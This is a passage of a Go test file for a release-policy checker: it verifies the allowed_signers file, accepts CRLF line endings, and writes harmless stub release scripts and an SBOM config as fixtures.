	requireFinding(t, findings, "allowed_signers must exactly match")
}

func TestReleasePolicyAcceptsCRLFAllowedSigners(t *testing.T) {
	repoRoot := t.TempDir()
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "allowed_signers"), []byte(strings.ReplaceAll(acceptedReleasePolicy.expectedSigners, "\n", "\r\n")), 0o644)

	findings := checkAllowedSigners(repoRoot)
	if len(findings) > 0 {
		t.Fatalf("expected CRLF-normalized allowed_signers to pass, got %#v", findings)
	}
}

const acceptedSyftReleaseConfig = `source:
  name: github.com/the-sarge/cpace
exclude:
  - './.git/**'
  - './.ras/**'
`

func writeReleasePolicyRepoFixture(t *testing.T, repoRoot string) {
	t.Helper()
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "workflows", "release.yml"), []byte(currentWorkflow(t)), 0o644)
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "allowed_signers"), []byte(acceptedReleasePolicy.expectedSigners), 0o644)
	mustWriteFile(t, filepath.Join(repoRoot, ".github", "syft-release.yaml"), []byte(acceptedSyftReleaseConfig), 0o644)
	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "release-tag-policy.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o755)
	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "release-metadata.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o755)
	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "release-tag-metadata.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o755)
	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "validate-cyclonedx-sbom.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o755)
	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "extract-release-notes.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o755)
}

func currentWorkflow(t *testing.T) string {
	t.Helper()
	in, err := os.ReadFile(filepath.Join("..", "..", ".github", "workflows", "release.yml"))
	if err != nil {
		t.Fatal(err)
	}
	return string(in)
}

func findingsForWorkflow(t *testing.T, in string) []finding {
	t.Helper()
	return findingsForWorkflowAgainstPolicy(t, in, acceptedReleasePolicy)
}

func findingsForWorkflowAgainstPolicy(t *testing.T, in string, policy releasePolicy) []finding {
	t.Helper()
	var doc yaml.Node
	if err := yaml.Unmarshal([]byte(in), &doc); err != nil {
		t.Fatal(err)
	}
	if len(doc.Content) != 1 {
		t.Fatalf("expected one YAML document, got %d", len(doc.Content))
	}
	return checkWorkflowAgainstPolicy("release.yml", doc.Content[0], policy)
}

func requireFinding(t *testing.T, findings []finding, want string) {
	t.Helper()
	for _, finding := range findings {
		if strings.Contains(finding.path, want) || strings.Contains(finding.msg, want) {
			return
		}
	}
	t.Fatalf("missing finding containing %q; got %#v", want, findings)
}

func requireOnlyFinding(t *testing.T, findings []finding, wantPath, wantMsg string) {
	t.Helper()
	if len(findings) != 1 {
		t.Fatalf("expected one finding, got %#v", findings)
	}
	if findings[0].path != wantPath || !strings.Contains(findings[0].msg, wantMsg) {
		t.Fatalf("expected finding %q containing %q, got %#v", wantPath, wantMsg, findings[0])
	}
}

func countFindingsContaining(findings []finding, want string) int {
	var count int
	for _, finding := range findings {
		if strings.Contains(finding.path, want) || strings.Contains(finding.msg, want) {
			count++
		}
	}
	return count
}

func replaceOnce(t *testing.T, in, old, new string) string {
	t.Helper()
	if !strings.Contains(in, old) {
		t.Fatalf("test fixture did not contain %q", old)
	}
	return strings.Replace(in, old, new, 1)
}

func mustWriteFile(t *testing.T, path string, content []byte, mode os.FileMode) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, content, mode); err != nil {
		t.Fatal(err)
	}
}

func mustChmod(t *testing.T, path string, mode os.FileMode) {
	t.Helper()
	if err := os.Chmod(path, mode); err != nil {
		t.Fatal(err)
	}
}
